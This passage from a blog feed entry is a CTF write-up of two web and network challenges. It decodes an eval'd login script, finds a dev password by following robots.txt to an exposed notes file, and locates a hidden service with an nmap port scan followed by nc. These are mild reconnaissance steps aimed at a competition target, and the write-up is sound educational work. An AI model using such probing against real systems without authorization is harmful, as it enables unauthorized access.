&lt;p&gt;I tried a few different passwords, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123456&lt;/code&gt;. There’s nothing about the challenge that implies anything with bruteforcing or fuzzing, plus the competition overseers were begging people to stop DDoSing their infra at this point. Poking around the javascript, we see some code that takes a base64 string, decodes it, then runs it:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eval(atob(&quot;Y29uc3QgZm9ybSA9IHsKICBwYXNzd29yZDogZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3Bhc3N3b3JkIiksCiAgc3VibWl0OiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjc3VibWl0IikKfTsKCmxldCBidXR0b24gPSBmb3JtLnN1Ym1pdC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIChlKSA9PiB7CiAgZS5wcmV2ZW50RGVmYXVsdCgpOwogIGNvbnN0IGxvZ2luID0gIi9hcGkvbG9naW4iOwoKICBmZXRjaChsb2dpbiwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgIEFjY2VwdDogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICBwYXNzd29yZDogZm9ybS5wYXNzd29yZC52YWx1ZSwKICAgIH0pLAogIH0pCiAgICAudGhlbigocmVzcG9uc2UpID0+IHJlc3BvbnNlLmpzb24oKSkKICAgIC50aGVuKChkYXRhKSA9PiB7CiAgICAgIGNvbnNvbGUubG9nKGRhdGEpOwogICAgICAvLyBjb2RlIGhlcmUgLy8KICAgICAgaWYgKGRhdGEuZXJyb3IpIHsKICAgICAgICBhbGVydCgiSW5jb3JyZWN0IFVzZXJuYW1lIG9yIFBhc3N3b3JkIik7IC8qZGlzcGxheXMgZXJyb3IgbWVzc2FnZSovCiAgICAgIH0gZWxzZSB7CiAgICAgICAgZG9jdW1lbnQubG9jYXRpb249Ii9hZG1pbiI7CiAgICAgIH0KICAgIH0pCiAgICAuY2F0Y2goKGVycikgPT4gewogICAgICBjb25zb2xlLmxvZyhlcnIpOwogICAgfSk7Cn0pOw==&quot;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like this is a red herring because when decoded, this just sends the password to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/admin&lt;/code&gt; endpoint:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#submit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/api/login&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/json, text/plain, */*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// code here //&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Incorrect Username or Password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*displays error message*/&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/admin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After butting my head against this challenge for half an hour, I decided to check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;, which is a webpage that lets search engine indexers know how to navigate the website, including which sites shouldn’t be indexed, or where machine-readable sitemaps are. Luckily, this yielded an interesting result recorded on the &lt;a href=&quot;https://web.archive.org/web/20240518231850/https://web-printer-t34jla4lcq-uc.a.run.app/robots.txt&quot;&gt;Wayback Machine&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: *
Disallow: /notes.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/notes.txt&lt;/code&gt; &lt;a href=&quot;https://web.archive.org/web/20240518231921/https://web-printer-t34jla4lcq-uc.a.run.app/notes.txt&quot;&gt;here&lt;/a&gt;, we get the password:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TODO: Finish implementing user database. Dev password is &apos;fAES5I64X1EL&apos;.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the password, we get the flag! However, I can’t seem to find it in my notes. I promise.&lt;/p&gt;

&lt;h2 id=&quot;ephemeral&quot;&gt;Ephemeral&lt;/h2&gt;
&lt;p&gt;I didn’t record any artifacts for this challenge, as it was trivial for a competitor at my skill level. However, it would make a fantastic learning example for someone looking into network tools for hacking.&lt;/p&gt;

&lt;p&gt;The challenge gives us a URL with an ssh server and credentials to log in. After logging in, it seems like our goal is to find an open port, connect to it and get the flag. We are only given access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;. I tried different ways to get the number of the open port by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss -tlpn&lt;/code&gt; and checking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/tcp&lt;/code&gt; dir, but both failed. Instead, I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap localhost -p0-65535&lt;/code&gt; to scan every port, which showed that an unidentifiable service is running on port 50119. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl localhost:50119&lt;/code&gt;, the process just hung, so I tried &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc localhost 50119&lt;/code&gt;, which returned the flag.&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="CTF" /><category term="writeup" /><summary type="html">On Saturday, I was selected to participate in the DoD SentinelOne challenge, a CTF put on by the US Military to recruit the best hackers in the nation. I ended up getting 109th out of 1440 participants, putting me at about the top 7.5% of the competitors.</summary></entry></feed>